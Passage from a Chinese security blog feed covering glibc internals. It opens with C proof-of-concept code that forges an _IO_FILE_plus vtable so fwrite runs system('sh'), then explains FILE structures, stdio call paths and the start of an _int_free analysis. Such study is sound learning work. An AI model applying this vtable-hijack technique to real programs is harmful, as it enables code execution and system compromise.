<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">#define system_ptr 0x7ffff7a52390;</div><div class="line"></div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    FILE *fp;</div><div class="line">    long long *vtable_ptr;</div><div class="line">    fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;);</div><div class="line">    vtable_ptr=*(long long*)((long long)fp+0xd8);     //get vtable</div><div class="line"></div><div class="line">    memcopy(fp,&quot;sh&quot;,3);</div><div class="line"></div><div class="line">    vtable_ptr[7]=system_ptr //xsputn</div><div class="line"></div><div class="line"></div><div class="line">    fwrite(&quot;hi&quot;,2,1,fp);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<font color="#f00">但是在目前libc2.23版本下，位于libc数据段的vtable是不可以进行写入的。不过，通过在可控的内存中伪造vtable的方法依然可以实现利用。</font>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">#define system_ptr 0x7ffff7a52390;</div><div class="line"></div><div class="line">int main(void)</div><div class="line">&#123;</div><div class="line">    FILE *fp;</div><div class="line">    long long *vtable_addr,*fake_vtable;</div><div class="line"></div><div class="line">    fp=fopen(&quot;123.txt&quot;,&quot;rw&quot;);</div><div class="line">    fake_vtable=malloc(0x40);</div><div class="line"></div><div class="line">    vtable_addr=(long long *)((long long)fp+0xd8);     //vtable offset</div><div class="line"></div><div class="line">    vtable_addr[0]=(long long)fake_vtable;</div><div class="line"></div><div class="line">    memcpy(fp,&quot;sh&quot;,3);</div><div class="line"></div><div class="line">    fake_vtable[7]=system_ptr; //xsputn</div><div class="line"></div><div class="line">    fwrite(&quot;hi&quot;,2,1,fp);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>我们首先分配一款内存来存放伪造的vtable，之后修改_IO_FILE_plus的vtable指针指向这块内存。因为vtable中的指针我们放置的是system函数的地址，因此需要传递参数&quot;/bin/sh&quot;或&quot;sh&quot;。</p>
<p>因为vtable中的函数调用时会把对应的_IO_FILE_plus指针作为第一个参数传递，因此这里我们把&quot;sh&quot;写入_IO_FILE_plus头部。之后对fwrite的调用就会经过我们伪造的vtable执行system(&quot;sh&quot;)。</p>
<p>同样，如果程序中不存在fopen等函数创建的_IO_FILE时，也可以选择stdin\stdout\stderr等位于libc.so中的_IO_FILE，这些流在printf\scanf等函数中就会被使用到。在libc2.23之前，这些vtable是可以写入并且不存在其他检测的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">print &amp;_IO_2_1_stdin_</div><div class="line">$2 = (struct _IO_FILE_plus *) 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;</div><div class="line"></div><div class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so</div><div class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so</div><div class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so</div><div class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;伪造vtable劫持程序流程&quot;&gt;&lt;a href=&quot;#伪造vtable劫持程序流程&quot; class=&quot;headerlink&quot; title=&quot;伪造vtable劫持程序流程&quot;&gt;&lt;/a&gt;伪造vtable劫持程序流程&lt;/h1&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot;
    
    </summary>
    
      <category term="pwn" scheme="http://yoursite.com/categories/pwn/"/>
    
    
      <category term="IO_FILE" scheme="http://yoursite.com/tags/IO-FILE/"/>
    
  </entry>
  
  <entry>
    <title>FILE文件结构介绍</title>
    <link href="http://yoursite.com/2018/06/22/FILE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E4%BB%8B%E7%BB%8D/"/>
    <id>http://yoursite.com/2018/06/22/FILE文件结构介绍/</id>
    <published>2018-06-22T12:54:17.000Z</published>
    <updated>2018-06-22T12:59:06.415Z</updated>
    
    <content type="html"><![CDATA[<h1 id="FILE结构"><a href="#FILE结构" class="headerlink" title="FILE结构"></a>FILE结构</h1><h2 id="FILE介绍"><a href="#FILE介绍" class="headerlink" title="FILE介绍"></a>FILE介绍</h2><p>FILE在Linux系统的标准IO库中是用于描述文件的结构，称为文件流。 FILE结构在程序执行fopen等函数时会进行创建，并分配在堆中。我们常定义一个指向FILE结构的指针来接收这个返回值。</p>
<p>FILE结构定义在libio.h中，如下所示</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">struct _IO_FILE &#123;</div><div class="line">  int _flags;       /* High-order word is _IO_MAGIC; rest is flags. */</div><div class="line">#define _IO_file_flags _flags</div><div class="line"></div><div class="line">  /* The following pointers correspond to the C++ streambuf protocol. */</div><div class="line">  /* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</div><div class="line">  char* _IO_read_ptr;   /* Current read pointer */</div><div class="line">  char* _IO_read_end;   /* End of get area. */</div><div class="line">  char* _IO_read_base;  /* Start of putback+get area. */</div><div class="line">  char* _IO_write_base; /* Start of put area. */</div><div class="line">  char* _IO_write_ptr;  /* Current put pointer. */</div><div class="line">  char* _IO_write_end;  /* End of put area. */</div><div class="line">  char* _IO_buf_base;   /* Start of reserve area. */</div><div class="line">  char* _IO_buf_end;    /* End of reserve area. */</div><div class="line">  /* The following fields are used to support backing up and undo. */</div><div class="line">  char *_IO_save_base; /* Pointer to start of non-current get area. */</div><div class="line">  char *_IO_backup_base;  /* Pointer to first valid character of backup area */</div><div class="line">  char *_IO_save_end; /* Pointer to end of non-current get area. */</div><div class="line"></div><div class="line">  struct _IO_marker *_markers;</div><div class="line"></div><div class="line">  struct _IO_FILE *_chain;</div><div class="line"></div><div class="line">  int _fileno;</div><div class="line">#if 0</div><div class="line">  int _blksize;</div><div class="line">#else</div><div class="line">  int _flags2;</div><div class="line">#endif</div><div class="line">  _IO_off_t _old_offset; /* This used to be _offset but it&apos;s too small.  */</div><div class="line"></div><div class="line">#define __HAVE_COLUMN /* temporary */</div><div class="line">  /* 1+column number of pbase(); 0 is unknown. */</div><div class="line">  unsigned short _cur_column;</div><div class="line">  signed char _vtable_offset;</div><div class="line">  char _shortbuf[1];</div><div class="line"></div><div class="line">  /*  char* _save_gptr;  char* _save_egptr; */</div><div class="line"></div><div class="line">  _IO_lock_t *_lock;</div><div class="line">#ifdef _IO_USE_OLD_IO_FILE</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<p>进程中的FILE结构会通过_chain域彼此连接形成一个链表，链表头部用全局变量_IO_list_all表示，通过这个值我们可以遍历所有的FILE结构。</p>
<p>在标准I/O库中，每个程序启动时有三个文件流是自动打开的：stdin、stdout、stderr。因此在初始状态下，_IO_list_all指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于libc.so的数据段。而我们使用fopen创建的文件流是分配在堆内存上的。</p>
<p>我们可以在libc.so中找到stdin\stdout\stderr等符号，这些符号是指向FILE结构的指针，真正结构的符号是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">_IO_2_1_stderr_</div><div class="line">_IO_2_1_stdout_</div><div class="line">_IO_2_1_stdin_</div></pre></td></tr></table></figure>
<p>但是事实上_IO_FILE结构外包裹着另一种结构_IO_FILE_plus，其中包含了一个重要的指针vtable指向了一系列函数指针。</p>
<p>在libc2.23版本下，32位的vtable偏移为0x94，64位偏移为0x228</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">struct _IO_FILE_plus</div><div class="line">&#123;</div><div class="line">    _IO_FILE    file;</div><div class="line">    IO_jump_t   *vtable;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>vtable是IO_jump_t类型的指针，IO_jump_t中保存了一些函数指针，在后面我们会看到在一系列标准IO函数中会调用这些函数指针</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">void * funcs[] = &#123;</div><div class="line">   1 NULL, // &quot;extra word&quot;</div><div class="line">   2 NULL, // DUMMY</div><div class="line">   3 exit, // finish</div><div class="line">   4 NULL, // overflow</div><div class="line">   5 NULL, // underflow</div><div class="line">   6 NULL, // uflow</div><div class="line">   7 NULL, // pbackfail</div><div class="line">   </div><div class="line">   8 NULL, // xsputn  #printf</div><div class="line">   9 NULL, // xsgetn</div><div class="line">   10 NULL, // seekoff</div><div class="line">   11 NULL, // seekpos</div><div class="line">   12 NULL, // setbuf</div><div class="line">   13 NULL, // sync</div><div class="line">   14 NULL, // doallocate</div><div class="line">   15 NULL, // read</div><div class="line">   16 NULL, // write</div><div class="line">   17 NULL, // seek</div><div class="line">   18 pwn,  // close</div><div class="line">   19 NULL, // stat</div><div class="line">   20 NULL, // showmanyc</div><div class="line">   21 NULL, // imbue</div><div class="line">&#125;;</div></pre></td></tr></table></figure>
<h2 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h2><p>fread是标准IO库函数，作用是从文件流中读数据，函数原型如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">size_t fread ( void *buffer, size_t size, size_t count, FILE *stream) ;</div></pre></td></tr></table></figure>
<ul>
<li>buffer 存放读取数据的缓冲区。</li>
<li>size：指定每个记录的长度。</li>
<li>count： 指定记录的个数。</li>
<li>stream：目标文件流。</li>
<li>返回值：返回读取到数据缓冲区中的记录个数</li>
</ul>
<p>fread的代码位于/libio/iofread.c中，函数名为_IO_fread，但真正的功能实现在子函数_IO_sgetn中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">_IO_size_t</div><div class="line">_IO_fread (buf, size, count, fp)</div><div class="line">     void *buf;</div><div class="line">     _IO_size_t size;</div><div class="line">     _IO_size_t count;</div><div class="line">     _IO_FILE *fp;</div><div class="line">&#123;</div><div class="line">  ...</div><div class="line">  bytes_read = _IO_sgetn (fp, (char *) buf, bytes_requested);</div><div class="line">  ...</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在_IO_sgetn函数中会调用_IO_XSGETN，而_IO_XSGETN是_IO_FILE_plus.vtable中的函数指针，在调用这个函数时会首先取出vtable中的指针然后再进行调用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">_IO_size_t</div><div class="line">_IO_sgetn (fp, data, n)</div><div class="line">     _IO_FILE *fp;</div><div class="line">     void *data;</div><div class="line">     _IO_size_t n;</div><div class="line">&#123;</div><div class="line">  return _IO_XSGETN (fp, data, n);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在默认情况下函数指针是指向_IO_file_xsgetn函数的，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">if (fp-&gt;_IO_buf_base</div><div class="line">        &amp;&amp; want &lt; (size_t) (fp-&gt;_IO_buf_end - fp-&gt;_IO_buf_base))</div><div class="line">      &#123;</div><div class="line">        if (__underflow (fp) == EOF)</div><div class="line">      break;</div><div class="line"></div><div class="line">        continue;</div><div class="line">      &#125;</div></pre></td></tr></table></figure>
<h2 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a>fwrite</h2><p>fwrite同样是标准IO库函数，作用是向文件流写入数据，函数原型如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">size_t fwrite(const void* buffer, size_t size, size_t count, FILE* stream);</div></pre></td></tr></table></figure>
<ul>
<li>buffer:是一个指针，对fwrite来说，是要写入数据的地址;</li>
<li>size:要写入内容的单字节数;</li>
<li>count:要进行写入size字节的数据项的个数;</li>
<li>stream:目标文件指针;</li>
<li>返回值：实际写入的数据项个数count。</li>
</ul>
<p>fwrite的代码位于/libio/iofwrite.c中，函数名为_IO_fwrite。 在_IO_fwrite中主要是调用_IO_XSPUTN来实现写入的功能。</p>
<p>根据前面对_IO_FILE_plus的介绍，可知_IO_XSPUTN位于_IO_FILE_plus的vtable中，调用这个函数需要首先取出vtable中的指针，再跳过去进行调用。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">written = _IO_sputn (fp, (const char *) buf, request);</div></pre></td></tr></table></figure>
<p>在_IO_XSPUTN对应的默认函数_IO_new_file_xsputn中会调用同样位于vtable中的_IO_OVERFLOW</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/* Next flush the (full) buffer. */</div><div class="line">     if (_IO_OVERFLOW (f, EOF) == EOF)</div></pre></td></tr></table></figure>
<p>_IO_OVERFLOW默认对应的函数是_IO_new_file_overflow</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">if (ch == EOF)</div><div class="line">    return _IO_do_write (f, f-&gt;_IO_write_base,</div><div class="line">             f-&gt;_IO_write_ptr - f-&gt;_IO_write_base);</div><div class="line">  if (f-&gt;_IO_write_ptr == f-&gt;_IO_buf_end ) /* Buffer is really full */</div><div class="line">    if (_IO_do_flush (f) == EOF)</div><div class="line">      return EOF;</div></pre></td></tr></table></figure>
<p>在_IO_new_file_overflow内部最终会调用系统接口write函数</p>
<h2 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h2><p>fopen在标准IO库中用于打开文件，函数原型如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">FILE *fopen(char *filename, *type);</div></pre></td></tr></table></figure>
<ul>
<li>filename:目标文件的路径</li>
<li>type:打开方式的类型</li>
<li>返回值:返回一个文件指针</li>
</ul>
<p>在fopen内部会创建FILE结构并进行一些初始化操作，下面来看一下这个过程</p>
<p>首先在fopen对应的函数__fopen_internal内部会调用malloc函数，分配FILE结构的空间。因此我们可以获知FILE结构是存储在堆上的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">*new_f = (struct locked_FILE *) malloc (sizeof (struct locked_FILE));</div></pre></td></tr></table></figure>
<p>之后会为创建的FILE初始化vtable，并调用_IO_file_init进一步初始化操作</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">_IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</div><div class="line">_IO_file_init (&amp;new_f-&gt;fp);</div></pre></td></tr></table></figure>
<p>在_IO_file_init函数的初始化操作中，会调用_IO_link_in把新分配的FILE链入_IO_list_all为起始的FILE链表中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">void</div><div class="line">_IO_link_in (fp)</div><div class="line">     struct _IO_FILE_plus *fp;</div><div class="line">&#123;</div><div class="line">    if ((fp-&gt;file._flags &amp; _IO_LINKED) == 0)</div><div class="line">    &#123;</div><div class="line">      fp-&gt;file._flags |= _IO_LINKED;</div><div class="line">      fp-&gt;file._chain = (_IO_FILE *) _IO_list_all;</div><div class="line">      _IO_list_all = fp;</div><div class="line">      ++_IO_list_all_stamp;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>之后__fopen_internal函数会调用_IO_file_fopen函数打开目标文件，_IO_file_fopen会根据用户传入的打开模式进行打开操作，总之最后会调用到系统接口open函数，这里不再深入。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if (_IO_file_fopen ((_IO_FILE *) new_f, filename, mode, is32) != NULL)</div><div class="line">    return __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</div></pre></td></tr></table></figure>
<p>总结一下fopen的操作是</p>
<ul>
<li>使用malloc分配FILE结构</li>
<li>设置FILE结构的vtable</li>
<li>初始化分配的FILE结构</li>
<li>将初始化的FILE结构链入FILE结构链表中</li>
<li>调用系统调用打开文件</li>
</ul>
<h2 id="fclose"><a href="#fclose" class="headerlink" title="fclose"></a>fclose</h2><p>fclose是标准IO库中用于关闭已打开文件的函数，其作用与fopen相反。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">int fclose(FILE *stream)</div></pre></td></tr></table></figure>
<p>功能：关闭一个文件流，使用fclose就可以把缓冲区内最后剩余的数据输出到磁盘文件中，并释放文件指针和有关的缓冲区</p>
<p>fclose首先会调用_IO_unlink_it将指定的FILE从_chain链表中脱链</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</div><div class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</div></pre></td></tr></table></figure>
<p>之后会调用_IO_file_close_it函数，_IO_file_close_it会调用系统接口close关闭文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</div><div class="line">    status = _IO_file_close_it (fp);</div></pre></td></tr></table></figure>
<p>最后调用vtable中的_IO_FINISH，其对应的是_IO_file_finish函数，其中会调用free函数释放之前分配的FILE结构</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">_IO_FINISH (fp);</div></pre></td></tr></table></figure>
<h2 id="printf-puts"><a href="#printf-puts" class="headerlink" title="printf/puts"></a>printf/puts</h2><p>printf和puts是常用的输出函数，在printf的参数是以&#39;\n&#39;结束的纯字符串时，printf会被优化为puts函数并去除换行符。</p>
<p>puts在源码中实现的函数是_IO_puts，这个函数的操作与fwrite的流程大致相同，函数内部同样会调用vtable中的_IO_sputn，结果会执行_IO_new_file_xsputn，最后会调用到系统接口write函数。</p>
<p>printf的调用栈回溯如下，同样是通过_IO_file_xsputn实现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">vfprintf+11</div><div class="line">_IO_file_xsputn</div><div class="line">_IO_file_overflow</div><div class="line">funlockfile</div><div class="line">_IO_file_write</div><div class="line">write</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;FILE结构&quot;&gt;&lt;a href=&quot;#FILE结构&quot; class=&quot;headerlink&quot; title=&quot;FILE结构&quot;&gt;&lt;/a&gt;FILE结构&lt;/h1&gt;&lt;h2 id=&quot;FILE介绍&quot;&gt;&lt;a href=&quot;#FILE介绍&quot; class=&quot;headerlink&quot; titl
    
    </summary>
    
    
      <category term="IO_FILE" scheme="http://yoursite.com/tags/IO-FILE/"/>
    
  </entry>
  
  <entry>
    <title>free源码分析——2</title>
    <link href="http://yoursite.com/2018/05/21/free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%942/"/>
    <id>http://yoursite.com/2018/05/21/free源码分析——2/</id>
    <published>2018-05-21T06:46:00.000Z</published>
    <updated>2018-05-21T06:56:40.191Z</updated>
    
    <content type="html"><![CDATA[<h1 id="free源码分析—-int-free"><a href="#free源码分析—-int-free" class="headerlink" title="free源码分析—_int_free"></a>free源码分析—_int_free</h1><p>根据上一章的分析可知，如果一个chunk不是由mmap分配得到，就会调用<code>_int_free</code>进行释放。下面来看，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">void __libc_free(void *mem) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    p = mem2chunk(mem);</div><div class="line">    if (chunk_is_mmapped(p))&#123;</div><div class="line">        ...</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ar_ptr = arena_for_chunk(p);</div><div class="line">    _int_free(ar_ptr, p, 0);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="int-free第一部分"><a href="#int-free第一部分" class="headerlink" title="_int_free第一部分"></a>_int_free第一部分</h2><p>首先来看<code>_int_free</code>第一部分，为了便于分析，这里省略了一些不关键的代码，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">static void _int_free(mstate av, mchunkptr p, int have_lock) &#123;</div><div class="line">    INTERNAL_SIZE_T size;</div><div class="line">    mfastbinptr *fb;</div><div class="line">    mchunkptr nextchunk;</div><div class="line">    INTERNAL_SIZE_T nextsize;</div><div class="line">    int nextinuse;</div><div class="line">    INTERNAL_SIZE_T prevsize;</div><div class="line">    mchunkptr bck;</div><div class="line">    mchunkptr fwd;</div><div class="line"></div><div class="line">    const char *errstr = NULL;</div><div class="line">    int locked = 0;</div><div class="line">    size = chunksize(p);</div><div class="line"></div><div class="line">    if (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK (size))) &#123;</div><div class="line">        goto errout;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    check_inuse_chunk(av, p);</div><div class="line"></div><div class="line">    if ((unsigned long) (size) &lt;= (unsigned long) (get_max_fast ())) &#123;</div><div class="line"></div><div class="line">        free_perturb(chunk2mem(p), size - 2 * SIZE_SZ);</div><div class="line">        set_fastchunks(av);</div><div class="line">        unsigned int idx = fastbin_index(size);</div><div class="line">        fb = &amp;fastbin(av, idx);</div><div class="line"></div><div class="line">        mchunkptr old = *fb, old2;</div><div class="line">        unsigned int old_idx = ~0u;</div><div class="line">        do &#123;</div><div class="line">            if (have_lock &amp;&amp; old != NULL)</div><div class="line">                old_idx = fastbin_index(chunksize(old));</div><div class="line">            p-&gt;fd = old2 = old;</div><div class="line">        &#125; while ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>第一部分首先是检查<code>size</code>变量的合法性，然后比较<code>get_max_fast()</code>判断<code>size</code>是否在fastbin的范围内，如果在fastbin的管理范围内，就通过<code>set_fastchunks</code>设置分配区的标志位表示fastbin有空闲chunk，接下来根据<code>size</code>获得即将添加的chunk在fastbin中的索引<code>idx</code>，并通过该索引获得头指针<code>fb</code>，最后通过CAS操作将该chunk添加到fastbin中。这里需要注意fastbin中存放的chunk是按照单向链表组织的。</p>
<h2 id="int-free第二部分"><a href="#int-free第二部分" class="headerlink" title="_int_free第二部分"></a>_int_free第二部分</h2><p>继续往下看，为了使整个代码结构清晰，这里保留了上一部分的if，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div></pre></td><td class="code"><pre><div class="line">static void _int_free(mstate av, mchunkptr p, int have_lock) &#123;</div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    if ((unsigned long) (size) &lt;= (unsigned long) (get_max_fast ())) &#123;</div><div class="line"></div><div class="line">        ...</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    else if (!chunk_is_mmapped(p)) &#123;</div><div class="line"></div><div class="line">        nextchunk = chunk_at_offset(p, size);</div><div class="line">        nextsize = chunksize(nextchunk);</div><div class="line"></div><div class="line">        free_perturb(chunk2mem(p), size - 2 * SIZE_SZ);</div><div class="line"></div><div class="line">        if (!prev_inuse(p)) &#123;</div><div class="line">            prevsize = p-&gt;prev_size;</div><div class="line">            size += prevsize;</div><div class="line">            p = chunk_at_offset(p, -((long ) prevsize));</div><div class="line">            unlink(av, p, bck, fwd);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        if (nextchunk != av-&gt;top) &#123;</div><div class="line">            nextinuse = inuse_bit_at_offset(nextchunk, nextsize);</div><div class="line"></div><div class="line">            if (!nextinuse) &#123;</div><div class="line">                unlink(av, nextchunk, bck, fwd);</div><div class="line">                size += nextsize;</div><div class="line">            &#125; else</div><div class="line">                clear_inuse_bit_at_offset(nextchunk, 0);</div><div class="line"></div><div class="line">            bck = unsorted_chunks(av);</div><div class="line">            fwd = bck-&gt;fd;</div><div class="line">            if (__glibc_unlikely(fwd-&gt;bk != bck)) &#123;</div><div class="line">                errstr = &quot;free(): corrupted unsorted chunks&quot;;</div><div class="line">                goto errout;</div><div class="line">            &#125;</div><div class="line">            p-&gt;fd = fwd;</div><div class="line">            p-&gt;bk = bck;</div><div class="line">            if 